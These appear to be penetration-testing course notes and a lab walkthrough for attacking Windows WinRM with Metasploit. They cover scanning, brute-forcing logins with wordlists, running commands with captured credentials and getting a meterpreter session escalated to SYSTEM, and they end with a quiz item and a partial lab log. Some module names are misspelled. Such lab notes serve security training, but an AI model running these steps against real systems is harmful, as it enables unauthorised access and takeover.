
- Can facilitate remote access
- On port 5985 and 5986
- Implements access control and security

Scan target with db_nmap in msfconsole
```
db_nmap -sS -sV -O -p- <target_ip>
```

Search for auxiliary module
```
search type:auxiliary winrm
```

Utilize module
Confirm URI by navigating to the IP address in the web browser
```
use auxiliary/scanner/winrm/winrim_auth_methods
options
```

Search for auxiliary module for bruteforce
```
search type:auxiliary winrim
```

Use module for brute force
```
use auxiliary/scanner/winrim/winrim_login
options
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
exploit
```

Search for winrm_cmd module
```
search winrm_cmd
```

Use module to launch command on target 
```
use auxiliary/scanner/winrm/winrm_cmd
set USERNAME <username_captured>
set PASSWORD <password_captured>
set CMD whoami
exploit
```

Search for exploit module
```
search type:exploit winrm_script
```

Use module to get meterpreter session
```
use exploit/windows/winrm/winrm_script_exec
options
set USERNAME <username_captured>
set PASSWORD <password_captured>
exploit
```

Migrate to System level process from Admin 
```
set FORCE_VBS true
exploit
```

## Quiz

What is the default HTTPS WinRM port?

	5986

## Lab

A Kali GUI machine and a target machine running a WinRM server are provided to you. The IP address of the target machine is provided in a text file named target placed on the Desktop of the Kali machine (/root/Desktop/target). 

Your task is to fingerprint the WinRM service using the tools available on the Kali machine and then exploit the vulnerability using the Metasploit framework exploit and auxiliary modules.

Objective: Exploit the WinRM service to get a meterpreter on the target and retrieve the flag!


```
 db_nmap -p- -sS -sV -O 10.4.21.132
5985   tcp    http           open   Microsoft HTTPAPI httpd 2.0 SSDP/UPnP
```

```
use auxiliary/scanner/winrm/winrm_auth_methods
[+] 10.4.21.132:5985: Negotiate protocol supported
[+] 10.4.21.132:5985: Basic protocol supported
```

```
use auxiliary/scanner/winrm/winrm_login

```